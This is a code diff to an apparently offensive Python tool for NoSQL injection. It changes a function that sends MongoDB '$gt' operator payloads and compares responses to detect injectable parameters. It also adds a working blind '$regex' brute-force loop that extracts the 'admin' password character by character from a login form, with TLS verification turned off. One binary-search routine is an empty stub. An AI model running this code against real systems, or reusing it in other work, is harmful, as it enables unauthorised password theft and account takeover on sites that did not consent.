@@ -25,34 +25,35 @@ def vulnTest(nsi):
     phaseTest = v
     form_data = {}
     for element in nsi.params:
+      element = element.replace("*", "")
       if (v == '[$gt]'):
         form_data[element+v] = '&'
       else:
         form_data[element+v] = x
-    
+
     if (nsi.reqMethod == '1') : #get
       reqData = Str.http_build_query(form_data)
       r = session.get(nsi.url)
       rInj = session.get(nsi.url+'?'+reqData)
     else:
-      reqData = form_data
-      r = requests.post(nsi.url, data=form_data)
+      r = requests.post(nsi.url)
       rInj = session.post(nsi.url, data=form_data)
+      # print("ori:"+r.text)
+      # print("inj:"+rInj.text)
       
     resOri = BeautifulSoup(r.text, 'lxml')
     resInj = BeautifulSoup(rInj.text, 'lxml')
     
     if resOri.body == resInj.body:
-      vulnerable.append({
-        v: False
-      })
-      print(colored(f"Might be not vulnerable with {phaseTest} Injection", 'red'))
+        vulnerable.append({
+          v: False
+        })
+        print(colored(f"Not vulnerable with {phaseTest} Injection", 'red'))
     else:
-      vulnerable.append({
-        v: True
-      })
-
-      print(colored(f"Possible vulnerable to {phaseTest} Injection!", 'green'))
+        vulnerable.append({
+          v: True
+        })
+        print(colored(f"Possible vulnerable to {phaseTest} Injection!", 'green'))
 
   return vulnerable
 
@@ -80,6 +81,35 @@ def paramMenu(nsi):
     if (nsi.param != 'd'):
       nsi.params.append(nsi.param)
   return nsi.typeParam
+
+def algMenu(nsi):
+  print(nsi.info())
+  print('''\n=================\n[Choose Algorithm]\n\n1) Linear Search\n2) Binary Search\n''')
+  nsi.alg = input("Choose Algorithm >>")
+  return nsi.alg
+
+def slinear(nsi):
+  username="admin"
+  password=""
+
+  while True:
+    for c in string.printable:
+      if c not in ['*','+','.','?','|', "'", '"', '&', ' ']:
+        form_data = {}
+        for element in nsi.params:
+          if ("*" in element):
+            element = element.replace("*", "")
+            form_data[element+'[$regex]'] = f"^{urllib.parse.quote_plus(password+c)}"
+          else:
+            form_data[element+'[$eq]'] = username
+        r = requests.post(nsi.url, data = form_data, verify = False)
+        
+        if 'Success' in r.text:
+            print("Found one more char : %s" % (password+c))
+            password += c
+
+def sbin(nsi):
+  return 0
 
 def getResponseBodyHandlingErrors(req):
     try:
